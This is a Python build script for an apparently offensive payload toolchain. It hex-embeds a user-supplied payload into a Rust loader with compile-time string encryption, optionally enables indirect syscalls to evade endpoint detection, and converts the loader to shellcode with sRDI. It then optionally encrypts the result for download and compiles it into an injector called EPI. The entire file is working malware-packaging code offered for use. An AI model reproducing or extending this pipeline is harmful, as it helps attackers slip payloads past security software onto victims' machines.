import argparse
import os
import time 

parser = argparse.ArgumentParser()

parser.add_argument('-p', '--path', type=str, required=False, help='Payload file path.')
parser.add_argument('-l', '--use_loader', action='store_true', help='Use the Loader.')
parser.add_argument('-i', '--use_syscalls', action='store_true', help='Force the Loader to use indirect syscalls.')
parser.add_argument('-d', '--download', action='store_true', help='Prepare the payload to be downloaded by EPI.')


args = parser.parse_args()
final_payload = ""

if args.use_loader is not False:
	print("[+] Using the provided Loader. Good choice.")

	if args.path is not None:
		with open('Loader\\src\\lib.rs', 'r') as file:
		    src = file.readlines()
		
		with open(args.path, 'rb') as f:
			hexdata = f.read().hex()

		src[13] = '\tlet bytes = lc!("' + hexdata + '");\n'

		with open('Loader\\src\\lib.rs', 'w') as file:
			file.writelines(src)

	if args.use_syscalls is not False:
		print("[+] Enabling indirect syscalls on the Loader.")
		sys = "true"
	else:
		sys = "false"

	with open('Loader\\dinvoke\\src\\lib.rs', 'r') as file:
		dinvoke = file.readlines()

	dinvoke[19] = 'static mut USE_IND_SYS: bool = ' + sys + ';\n'

	with open('Loader\\dinvoke\\src\\lib.rs', 'w') as file:
		file.writelines(dinvoke)

	print("[-] Building the Loader...")
	ret = os.system('cmd /c "cd .\\Loader && cargo build --release"')
	if ret != 0:
		print("[x] Error building the Loader.")
		exit()

	path_a = os.path.join(os.getcwd(), 'sRDI')
	path_b = os.path.join(os.getcwd(), 'Loader', 'target', 'release','loader.dll')
	command = f'cmd /c "cd {path_a} && python ConvertToShellcode.py -f run {path_b}"'

	ret = os.system(command)
	if ret != 0:
		command = f'cmd /c "cd {path_a} && python3 ConvertToShellcode.py -f run {path_b}"'
		ret = os.system(command)
		if ret != 0:
			print("[x] Error converting the Loader into sRDI.")
			exit()

	if args.download is not False:
		key = os.environ['LITCRYPT_ENCRYPT_KEY'].replace('"','')
		print("[-] Encrypting payload with key " + key)
		path_a = os.path.join(os.getcwd(), 'utils')
		path_b = os.path.join(os.getcwd(), 'Loader', 'target', 'release','loader.bin')
		command = f'cmd /c "cd {path_a} && encrypt.exe {path_b} ' + key + '"'
		ret = os.system(command)
		if ret != 0:
			print("[x] Error encrypting the payload.")
		else:
			print("[+] payload.bin successfully written to payload directory.")
		
		final_payload = ""
	
	else:

		with open('.\\Loader\\target\\release\\loader.bin', 'rb') as f:
			final_payload = f.read().hex()	

else:

	if args.path is not None:
		with open(args.path, 'rb') as f:
			final_payload = f.read().hex()


with open('EPI\\src\\main.rs', 'r') as file:
	epi = file.readlines()

epi[12] = '\tlet mut bytes = lc!("' + final_payload + '");\n'

with open('EPI\\src\\main.rs', 'w') as file:
	file.writelines(epi)

print("[-] Building EPI...")
ret = os.system('cmd /c "cd .\\EPI && cargo build --release"')
if ret != 0:
	print("[x] Error building EPI.")
	exit()

print("[+] Build successfully completed.")

